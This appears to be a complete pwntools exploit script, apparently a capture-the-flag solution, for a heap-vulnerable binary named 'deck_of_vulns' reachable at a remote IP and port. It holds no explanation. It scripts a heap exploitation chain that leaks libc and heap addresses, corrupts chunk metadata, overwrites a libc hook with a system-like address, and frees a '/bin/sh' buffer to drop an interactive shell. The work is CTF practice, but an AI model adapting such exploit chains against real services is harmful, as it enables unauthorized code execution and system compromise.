from pwn import *
import time
import struct
if args['REMOTE']:
    io = remote('206.189.21.230',31841)
elif args['LOCAL']:\
    io = remote('127.0.0.1',1337)
else:
    io = process('./deck_of_vulns',env={'LD_PRELOAD':"./libc.so.6"})
    if args['ATTACH']:
        gdb.attach(io)
        
def flip(io):
    io.recvuntil(b'choice: ')
    io.sendline(b'5 ')

def add(io,size,data):
    io.sendline(b'1')
    io.recvuntil(b'details? ')
    io.sendline(size)
    io.recvuntil(b'details: ')
    io.sendline(data)

def add_s(io,size):
    io.recvuntil(b'choice: ')
    io.sendline(b'1')
    io.recvuntil(b'details? ')
    io.sendline(size)

def free(io):
    io.recvuntil(b'choice: ')
    io.sendline(b'2')

def edit(io,data):
    io.recvuntil(b'choice: ')
    io.sendline(b'3')
    io.recvuntil(b'details: ')
    io.sendline(data)

def read(io):
    io.recvuntil(b'choice: ')
    io.sendline(b'4')

###################### LEAK LIBC ######################

add(io,b'2066',b'HELL01')
add(io,b'2066',b'HELLO2')
flip(io)
free(io)
add(io,b'2100',b'HELLO3')
add(io,b'2066',b'')
read(io)
io.readline()
io.readline()
libc = (int.from_bytes(io.readline()[:-1],'little')) << 8
libc_base = libc-1830912
print('LIBC: ',hex(libc_base))

###################### LEAK HEAP ######################

edit(io,b'AAAAAAAAAAAAAAA')
read(io)
io.readline()
io.readline()
heap = int.from_bytes(io.readline()[:-1],'little')
print('HEAP:',hex(heap))
free(io)
free(io)
free(io)

###################### DROPPING SHELL ######################

add(io,b'2066',b'HELL01')
flip(io)
for a in range(80):
    time.sleep(0.2)
    add(io,b'2066',b'HELLO2')

add(io,b'2066',b'HELLO2')

flip(io)
edit(io,b'A'*736+p64(0x0000000000000810)+p64(libc+11104))
flip(io)
edit(io,p64(libc_base+0x49bc0))
flip(io)
edit(io,b'/bin/sh'+b'\x00'*5)
free(io)

io.interactive()
